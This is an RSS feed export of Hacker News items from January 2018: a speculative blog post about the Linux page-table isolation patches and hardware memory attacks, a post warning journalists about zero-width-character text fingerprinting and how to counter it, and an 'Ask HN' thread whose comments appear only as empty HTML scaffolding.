<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>The mysterious case of the Linux Page Table Isolation patches</title>
<link>http://pythonsweetness.tumblr.com/post/169166980422/the-mysterious-case-of-the-linux-page-table</link>
<guid isPermaLink="true" >http://pythonsweetness.tumblr.com/post/169166980422/the-mysterious-case-of-the-linux-page-table</guid>
<description>&lt;p&gt;&lt;em&gt;[Various errors and updates are addressed in &lt;a href=&quot;http://pythonsweetness.tumblr.com/post/169217189597/quiet-in-the-peanut-gallery&quot;&gt;Quiet in the peanut gallery&lt;/a&gt;]&lt;/em&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;em&gt;tl;dr:&lt;/em&gt; there is presently an embargoed security bug impacting apparently all contemporary CPU architectures that implement virtual memory, requiring hardware changes to fully resolve. Urgent development of a software mitigation is being done in the open and recently landed in the Linux kernel, and a similar mitigation began appearing in NT kernels in November. In the worst case the software fix causes huge slowdowns in typical workloads. There are hints the attack impacts common virtualization environments including Amazon EC2 and Google Compute Engine, and additional hints the exact attack may involve a new variant of Rowhammer.&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;I don’t really care much for security issues normally, but I adore a little intrigue, and it seems anyone who would normally write about these topics is either somehow very busy, or already knows the details and isn’t talking, which leaves me with a few hours on New Years’ Day to go digging for as much information about this mystery as I could piece together.&lt;/p&gt;
&lt;p&gt;Beware this is very much a connecting-the-invisible-dots type affair, so it mostly represents guesswork until such times as the embargo is lifted. From everything I’ve seen, including the vendors involved, many fireworks and much drama is likely when that day arrives.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LWN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The trail begins with LWN’s &lt;a href=&quot;http://t.umblr.com/redirect?z=https%3A%2F%2Flwn.net%2FArticles%2F741878%2F&amp;amp;t=ODY1YTM4MjYyYzU2NzNmM2VmYzEyMGIzODJkY2IxNDg0MDhkZDM1MSxXRG55eVpXNw%3D%3D&amp;amp;b=t%3AqBH2b-yWL63V8acbuG-EUQ&amp;amp;p=http%3A%2F%2Fpythonsweetness.tumblr.com%2Fpost%2F169166980422%2Fthe-mysterious-case-of-the-linux-page-table&amp;amp;m=1&quot;&gt;current state of kernel page-table isolation&lt;/a&gt; article posted on December 20th. It’s apparent from the tone that a great deal of urgent work by the core kernel developers has been poured into the &lt;a href=&quot;http://t.umblr.com/redirect?z=https%3A%2F%2Flwn.net%2FArticles%2F738975%2F&amp;amp;t=MzQxMmMyYThhNDdiMGJkZmRmZWI5NDkzZmQ3ZTM4ZDcwYzFhMjU5OSxXRG55eVpXNw%3D%3D&amp;amp;b=t%3AqBH2b-yWL63V8acbuG-EUQ&amp;amp;p=http%3A%2F%2Fpythonsweetness.tumblr.com%2Fpost%2F169166980422%2Fthe-mysterious-case-of-the-linux-page-table&amp;amp;m=1&quot;&gt;KAISER patch series&lt;/a&gt; first posted in October by a group of researchers from &lt;a href=&quot;http://t.umblr.com/redirect?z=https%3A%2F%2Fwww.iaik.tugraz.at%2Fcontent%2Fresearch%2Fsesys%2F&amp;amp;t=NzEwZjg5YmQ1ZTNlZWIyYWE0YzgzZmZjN2ZmM2E2YjMzNDk5YTk4YixXRG55eVpXNw%3D%3D&amp;amp;b=t%3AqBH2b-yWL63V8acbuG-EUQ&amp;amp;p=http%3A%2F%2Fpythonsweetness.tumblr.com%2Fpost%2F169166980422%2Fthe-mysterious-case-of-the-linux-page-table&amp;amp;m=1&quot;&gt;TU Graz&lt;/a&gt; in Austria.&lt;/p&gt;
&lt;p&gt;The purpose of the series is conceptually simple: to prevent a variety of attacks by unmapping as much of the Linux kernel from the process page table while the process is running in user space, greatly hindering attempts to identify kernel virtual address ranges from unprivileged userspace code.&lt;/p&gt;
&lt;p&gt;The group’s paper describing KAISER, &lt;a href=&quot;http://t.umblr.com/redirect?z=https%3A%2F%2Fgruss.cc%2Ffiles%2Fkaiser.pdf&amp;amp;t=OTk4NGQwZTQ1NTdlNzE1ZGEyZTdlY2ExMTY1MTJhNzk2ODIzYWY1OSxXRG55eVpXNw%3D%3D&amp;amp;b=t%3AqBH2b-yWL63V8acbuG-EUQ&amp;amp;p=http%3A%2F%2Fpythonsweetness.tumblr.com%2Fpost%2F169166980422%2Fthe-mysterious-case-of-the-linux-page-table&amp;amp;m=1&quot;&gt;KASLR is Dead: Long Live KASLR&lt;/a&gt;, makes specific reference in its abstract to removing all knowledge of kernel address space from the memory management hardware while user code is active on the CPU.&lt;/p&gt;
&lt;p&gt;Of particular interest with this patch set is that it touches a core, wholly fundamental pillar of the kernel (and its interface to userspace), and that it is obviously being rushed through with the greatest priority. When reading about memory management changes in Linux, usually the first reference to a change happens long before the change is ever merged, and usually after numerous rounds of review, rejection and flame war spanning many seasons and moon phases.&lt;/p&gt;
&lt;p&gt;The KAISER (now KPTI) series was merged in some time less than 3 months.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Recap: ASLR&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;On the surface, the patches appear designed to ensure Address Space Layout Randomization remains effective: this is a security feature of modern operating systems that attempts to introduce as many random bits as possible into the address ranges for commonly mapped objects.&lt;/p&gt;
&lt;p&gt;For example, on invoking /usr/bin/python, the dynamic linker will arrange for the system C library, heap, thread stack and main executable to all receive randomly assigned address ranges:&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;$ bash -c ‘grep heap /proc/$$/maps’&lt;br/&gt;019de000-01acb000 rw-p 00000000 00:00 0                                  [heap]&lt;br/&gt;$ bash -c 'grep heap /proc/$$/maps’&lt;br/&gt;023ac000-02499000 rw-p 00000000 00:00 0                                  [heap]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Notice how the start and end offset for the bash process heap changes across runs.&lt;/p&gt;
&lt;p&gt;The effect of this feature is that, should a buffer management bug lead to an attacker being able to overwrite some memory address pointing at program code, and that address should later be used in program control flow, such that the attacker can divert control flow to a buffer containing contents of their choosing, it becomes much more difficult for the attacker to populate the buffer with machine code that would lead to, for example, the system() C library function being invoked, as the address of that function varies across runs.&lt;/p&gt;
&lt;p&gt;This is a simple example, ASLR is designed to protect many similar such scenarios, including preventing the attacker from learning the addresses of program data that may be useful for modifying control flow or implementing an attack.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;KASLR is “simply” ASLR applied to the kernel itself: on each reboot of the system, address ranges belonging to the kernel are randomized such that an attacker who manages to divert control flow while running in kernel mode cannot guess addresses for functions and structures necessary for implementing their attack, such as locating the current process data, and flipping the active UID from an unprivileged user to root, etc.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bad news: the software mitigation is expensive&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The primary reason for the old Linux behaviour of mapping kernel memory in the same page tables as user memory is so that when the user’s code triggers a system call, fault, or an interrupt fires, it is not necessary to change the virtual memory layout of the running process.&lt;/p&gt;
&lt;p&gt;Since it is unnecessary to change the virtual memory layout, it is further unnecessary to flush highly performance-sensitive CPU caches that are dependant on that layout, primarily the &lt;a href=&quot;http://t.umblr.com/redirect?z=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FTranslation_lookaside_buffer&amp;amp;t=NjEyNGUzNTk2MGY3ODY3ODIxZjQ1Yjc4YWZjMGNmNmI1OWU1M2U0YyxXRG55eVpXNw%3D%3D&amp;amp;b=t%3AqBH2b-yWL63V8acbuG-EUQ&amp;amp;p=http%3A%2F%2Fpythonsweetness.tumblr.com%2Fpost%2F169166980422%2Fthe-mysterious-case-of-the-linux-page-table&amp;amp;m=1&quot;&gt;Translation Lookaside Buffer&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;With the page table splitting patches merged, it becomes necessary for the kernel to flush these caches every time the kernel begins executing, and every time user code resumes executing. For some workloads, the effective total loss of the TLB lead around every system call leads to highly visible slowdowns: &lt;a href=&quot;https://twitter.com/grsecurity/status/947439275460702208&quot;&gt;@grsecurity measured a simple case&lt;/a&gt; where Linux “du -s” suffered a 50% slowdown on a recent AMD CPU.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;34C3&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Over at this year’s CCC, you can find another of the TU Graz researchers &lt;a href=&quot;http://t.umblr.com/redirect?z=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dewe3-mUku94&amp;amp;t=NjczZmIzNWY3YTA2NGFiZDJmYThlMjlhMWM1YTE3NThhNzY0OGJlMSxXRG55eVpXNw%3D%3D&amp;amp;b=t%3AqBH2b-yWL63V8acbuG-EUQ&amp;amp;p=http%3A%2F%2Fpythonsweetness.tumblr.com%2Fpost%2F169166980422%2Fthe-mysterious-case-of-the-linux-page-table&amp;amp;m=1&quot;&gt;describing a pure-Javascript ASLR attack&lt;/a&gt; that works by carefully timing the operation of the CPU memory management unit as it traverses the page tables that describe the layout of virtual memory. The effect is that through a combination of high precision timing and selective eviction of CPU cache lines, a Javascript program running in a web browser can recover the virtual address of a Javascript object, enabling subsequent attacks against browser memory management bugs.&lt;/p&gt;
&lt;p&gt;So again, on the surface, we have a group authoring the KAISER patches also demonstrating a technique for unmasking ASLR’d addresses, and the technique, demonstrated using Javascript, is imminently re-deployable against an operating system kernel.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Recap: Virtual Memory&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In the usual case, when some machine code attempts to load, store, or jump to a memory address, modern CPUs must first translate this &lt;em&gt;virtual address&lt;/em&gt; to a &lt;em&gt;physical address,&lt;/em&gt; by way of walking a series of OS-managed arrays (called page tables) that describe a mapping between virtual memory and physical RAM installed in the machine.&lt;/p&gt;
&lt;p&gt;Virtual memory is possibly the single most important robustness feature in modern operating systems: it is what prevents, for example, a dying process from crashing the operating system, a web browser bug crashing your desktop environment, or one virtual machine running in Amazon EC2 from effecting changes to another virtual machine on the same host.&lt;/p&gt;
&lt;p&gt;The attack works by exploiting the fact that the CPU maintains numerous caches, and by carefully manipulating the contents of these caches, it is possible to infer which addresses the memory management unit is accessing behind the scenes as it walks the various levels of page tables, since an uncached access will take longer (in real time) than a cached access. By detecting which elements of the page table are accessed, it is possible to recover the majority of the bits in the virtual address the MMU was busy resolving.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Evidence for motivation, but not panic&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We have found motivation, but so far we have not seen anything to justify the sheer panic behind this work. ASLR in general is an imperfect mitigation and very much a last line of defence: there is barely a 6 month period where even a non-security minded person can read about some new method for unmasking ASLR’d pointers, and reality has been this way for as long as ASLR has existed.&lt;/p&gt;
&lt;p&gt;Fixing ASLR alone is not sufficient to describe the high priority motivation behind the work.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Evidence: it’s a hardware security bug&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From reading through the patch series, a number of things are obvious.&lt;/p&gt;
&lt;p&gt;First of all, as &lt;a href=&quot;https://twitter.com/grsecurity/status/947147105684123649&quot;&gt;@grsecurity points out&lt;/a&gt;, some comments in the code have been redacted, and additionally the main documentation file describing the work is presently missing entirely from the Linux source tree.&lt;/p&gt;
&lt;p&gt;Examining the code, it is structured in the form of a runtime patch applied at boot only when the kernel detects the system is impacted, using exactly the same mechanism that, for example, applies mitigations for the infamous &lt;a href=&quot;http://t.umblr.com/redirect?z=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FPentium_F00F_bug&amp;amp;t=Yjc4MDZhNDZjZDdiYWNkNmJkNjQ3ZDNjZmVlZmRkMGM2NDYwN2I2YSxXRG55eVpXNw%3D%3D&amp;amp;b=t%3AqBH2b-yWL63V8acbuG-EUQ&amp;amp;p=http%3A%2F%2Fpythonsweetness.tumblr.com%2Fpost%2F169166980422%2Fthe-mysterious-case-of-the-linux-page-table&amp;amp;m=1&quot;&gt;Pentium F00F bug&lt;/a&gt;:&lt;br/&gt;&lt;/p&gt;
&lt;img src=&quot;http://78.media.tumblr.com/1c80c45e14c1e676b35cdd89cc9b557c/tumblr_inline_p1untxZBBD1rkm8fh_500.jpg&quot; data-orig-width=&quot;667&quot; data-orig-height=&quot;315&quot; width=&quot;500&quot; height=&quot;236&quot;/&gt;&lt;p&gt;&lt;strong&gt;More clues: Microsoft have also implemented page table splitting&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From a little digging through the FreeBSD source tree, it seems that so far other free operating systems are not implementing page table splitting, however as noted by &lt;a href=&quot;https://twitter.com/aionescu/status/930412525111296000&quot;&gt;Alex Ioniscu on Twitter&lt;/a&gt;, the work already is not limited to Linux: public NT kernels from as early as November have begun to implement the same technique.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guesswork: Rowhammer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Digging further into the work of the researchers at TU Graz, we find &lt;a href=&quot;http://t.umblr.com/redirect?z=https%3A%2F%2Fwww.tugraz.at%2Fen%2Ftu-graz%2Fservices%2Fnews-stories%2Fplanet-research%2Fsingleview%2Farticle%2Fwenn-rowhammer-nur-noch-einmal-klopft%2F&amp;amp;t=NWM1ZjZlZWU2NzFlMWIyNmI5MGZlNjJlZmM2YTlhOTIzNGY3Yjk4NyxXRG55eVpXNw%3D%3D&amp;amp;b=t%3AqBH2b-yWL63V8acbuG-EUQ&amp;amp;p=http%3A%2F%2Fpythonsweetness.tumblr.com%2Fpost%2F169166980422%2Fthe-mysterious-case-of-the-linux-page-table&amp;amp;m=1&quot;&gt;When rowhammer only knocks once&lt;/a&gt;, an announcement on December 4th of a &lt;a href=&quot;http://t.umblr.com/redirect?z=https%3A%2F%2Farxiv.org%2Fabs%2F1710.00551&amp;amp;t=ZjAyMDUzZWRmYjExNGNlYzRlMjE1NTliMTI2M2Y4YjkxMTFhMjI0OCxXRG55eVpXNw%3D%3D&amp;amp;b=t%3AqBH2b-yWL63V8acbuG-EUQ&amp;amp;p=http%3A%2F%2Fpythonsweetness.tumblr.com%2Fpost%2F169166980422%2Fthe-mysterious-case-of-the-linux-page-table&amp;amp;m=1&quot;&gt;new variant of the Rowhammer attack&lt;/a&gt;:&lt;br/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;In this paper, we present novel Rowhammer attack and exploitation primitives, showing that even a combination of all defenses is ineffective. Our new attack technique, one-location hammering, breaks previous assumptions on requirements for triggering the Rowhammer bug&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As a quick recap, Rowhammer is a class of problem fundamental to most (all?) kinds of commodity DRAMs, such as the memory in the average computer. Through precise manipulation of one area of memory, it is possible to cause degradation of storage in a related (but otherwise logically distinct) area of memory. The effect is that Rowhammer can be used to flip bits of memory that unprivileged user code should have no access to, such as bits describing how much access that code should have to the rest of the system.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;I found this work on Rowhammer particularly interesting, not least for its release being in such close proximity to the page table splitting patches, but because Rowhammer attacks require a target: you must know the physical address of the memory you are attempting to mutate, and a first step to learning a physical address may be learning a virtual address, such as in the KASLR unmasking work.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guesswork: it effects major cloud providers&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On the kernel mailing list we can see, in addition to the names of subsystem maintainers, e-mail addresses belonging to employees of Intel, Amazon and Google. The presence of the two largest cloud providers is particularly interesting, as this provides us with a strong clue that the work may be motivated in large part by virtualization security.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Which leads to even more guessing: virtual machine RAM, and the virtual memory addresses used by those virtual machines are ultimately represented as large contiguous arrays on the host machine, arrays that, especially in the case of only 2 tenants on a host machine, are assigned by memory allocators in the Xen and Linux kernels that likely have very predictable behaviour.&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Favourite guess: it is a privilege escalation attack against hypervisors&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Putting it all together, I would not be surprised if we start 2018 with the release of the mother of all hypervisor privilege escalation bugs, or something similarly systematic as to drive so much urgency, and the presence of so many interesting names on the patch set’s CC list.&lt;/p&gt;
&lt;p&gt;One final tidbit, while I’ve lost my place reading through the patches, there is some code that specifically marked either paravirtual or HVM Xen as unaffected.&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Invest in popcorn, 2018 is going to be fun&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;It’s totally possible this guess is miles off reality, but one thing is for sure, it’s going to be an exciting few weeks when whatever this thing is published.&lt;/p&gt;
</description>
<pubDate>Mon, 01 Jan 2018 16:27:42 +0000</pubDate>
<dc:creator>KirinDave</dc:creator>
<og:title>The mysterious case of the Linux Page Table Isolation patches</og:title>
<og:url>http://pythonsweetness.tumblr.com/post/169166980422/the-mysterious-case-of-the-linux-page-table</og:url>
<og:description>[Various errors and updates are addressed in Quiet in the peanut gallery] tl;dr: there is presently an embargoed security bug impacting apparently all contemporary CPU architectures that implement...</og:description>
<og:type>tumblr-feed:entry</og:type>
<og:image>http://78.media.tumblr.com/1c80c45e14c1e676b35cdd89cc9b557c/tumblr_inline_p1untxZBBD1rkm8fh_540.jpg</og:image>
<dc:format>text/html</dc:format>
<dc:identifier>http://pythonsweetness.tumblr.com/post/169166980422/the-mysterious-case-of-the-linux-page-table</dc:identifier>
</item>
<item>
<title>Zero-Width Characters: Invisibly fingerprinting text</title>
<link>https://www.zachaysan.com/writing/2017-12-30-zero-width-characters</link>
<guid isPermaLink="true" >https://www.zachaysan.com/writing/2017-12-30-zero-width-characters</guid>
<description>&lt;header readability=&quot;2&quot;&gt;
&lt;p&gt;Invisibly fingerprinting text&lt;/p&gt;
&lt;/header&gt;&lt;p&gt;&lt;strong&gt;Journalists watch out—you may be unintentionally revealing sources.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In early 2016 I realized that it was possible to use zero-width characters, like &lt;a href=&quot;https://en.wikipedia.org/wiki/Zero-width_non-joiner&quot;&gt;zero-width non-joiner&lt;/a&gt; or other zero-width characters like the &lt;a href=&quot;https://en.wikipedia.org/wiki/Zero-width_space&quot;&gt;zero-width space&lt;/a&gt; to fingerprint text. Even with just a single type of zero-width character the presence or non-presence of the non-visible character is enough bits to fingerprint even the shortest text.&lt;/p&gt;
&lt;p&gt;We're​ not the​ same text, even though we look the same.&lt;/p&gt;
&lt;p&gt;We're not the same​ text, even though we look the same.&lt;/p&gt;
&lt;p&gt;Unlike previous text fingerprinting techniques, zero-width characters are not removed when formatting is removed from text. They're often not even visible in contexts where software experts would expect them to be, like on a programming terminal.&lt;/p&gt;
&lt;p&gt;I also realized that it is possible to use &lt;a href=&quot;https://en.wikipedia.org/wiki/Homoglyph&quot;&gt;homoglyph&lt;/a&gt; substitution (e.g., replacing the letter &quot;a&quot; with its Cyrillic counterpart, &quot;а&quot;), but I dismissed this as too easy to detect due to the differences in character rendering across fonts and systems. However, differences in dashes (en, em, and hyphens), quotes (straight vs curly), word spelling (color vs colour), and the number of spaces after sentence endings could probably go undetected due to their frequent use in real text.&lt;/p&gt;
&lt;p&gt;With increased effort, synonyms (huge vs large vs massive) can also be used, though it would require some manual setup because words lack single definitions (due to homonyms) and in some contexts would be easier to detect since differing word lengths may cause sentences to wrap differently across documents.&lt;/p&gt;
&lt;p&gt;Countermeasures for journalists or others engaged with leakers, in decreasing order of effectiveness:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Avoid releasing excerpts and raw documents.&lt;/li&gt;
&lt;li&gt;Get the same documents from multiple leakers to ensure they have the exact same content on a byte-by-byte level.&lt;/li&gt;
&lt;li&gt;Manually retype excerpts to avoid invisible characters and homoglyphs.&lt;/li&gt;
&lt;li&gt;Keep excerpts short to limit the amount of information shared.&lt;/li&gt;
&lt;li&gt;Use a tool that strips non-whitelisted characters from text before sharing it with others.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;After discovering these techniques I shared them with some friends to try to help track down a cyber criminal which they thought might be an insider threat (it wasn't, it was just a normal blackhat hacker). Then the White House started leaking like an old hose, so I continued to keep quiet. The reason I'm writing about this now is that it appears both &lt;a href=&quot;https://www.researchgate.net/publication/308044170&quot;&gt;homoglyph substitution&lt;/a&gt; and &lt;a href=&quot;http://blog.fastforwardlabs.com/2017/06/23/fingerprinting-documents-with-steganography.html&quot;&gt;zero-width fingerprinting&lt;/a&gt; have been discovered by others, so journalists should be informed of the existence of these techniques.&lt;/p&gt;
&lt;p&gt;If your news organization has a pre-existing trove of documents it should be fairly straightforward to scan them for zero-width characters or mixed character encodings. Detecting synonym substitution would require multiple documents and some custom code, but should be fairly straightforward for an intermediately skilled data scientist or software developer with some time.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update: &lt;a href=&quot;https://www.zachaysan.com/writing/2018-01-01-fingerprinting-update&quot;&gt;Subsequent article&lt;/a&gt; based on reader feedback and other comments.&lt;/strong&gt;&lt;/p&gt;

</description>
<pubDate>Mon, 01 Jan 2018 15:17:59 +0000</pubDate>
<dc:creator>based2</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.zachaysan.com/writing/2017-12-30-zero-width-characters</dc:identifier>
</item>
<item>
<title>Ask HN: What’s your favorite talk from 2017?</title>
<link>https://news.ycombinator.com/item?id=16045859</link>
<guid isPermaLink="true" >https://news.ycombinator.com/item?id=16045859</guid>
<description>&lt;tr class=&quot;athing comtr&quot; id=&quot;16046184&quot; readability=&quot;8.4075342465753&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.2037671232877&quot;&gt;&lt;tr readability=&quot;8.4075342465753&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.5667808219178&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16050094&quot; readability=&quot;7.8135593220339&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.9067796610169&quot;&gt;&lt;tr readability=&quot;7.8135593220339&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.4726930320151&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046345&quot; readability=&quot;2.4718309859155&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2359154929577&quot;&gt;&lt;tr readability=&quot;2.4718309859155&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046509&quot; readability=&quot;2.3877551020408&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046927&quot; readability=&quot;4.4467213114754&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.2233606557377&quot;&gt;&lt;tr readability=&quot;4.4467213114754&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;4.4467213114754&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048233&quot; readability=&quot;7.5555555555556&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.7777777777778&quot;&gt;&lt;tr readability=&quot;7.5555555555556&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.0833333333333&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048575&quot; readability=&quot;5.219730941704&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.609865470852&quot;&gt;&lt;tr readability=&quot;5.219730941704&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.914798206278&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049666&quot; readability=&quot;6.4258675078864&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.2129337539432&quot;&gt;&lt;tr readability=&quot;6.4258675078864&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049389&quot; readability=&quot;3.9402985074627&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049792&quot; readability=&quot;6.5490797546012&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.2745398773006&quot;&gt;&lt;tr readability=&quot;6.5490797546012&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.7423312883436&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046270&quot; readability=&quot;2.5989304812834&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2994652406417&quot;&gt;&lt;tr readability=&quot;2.5989304812834&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
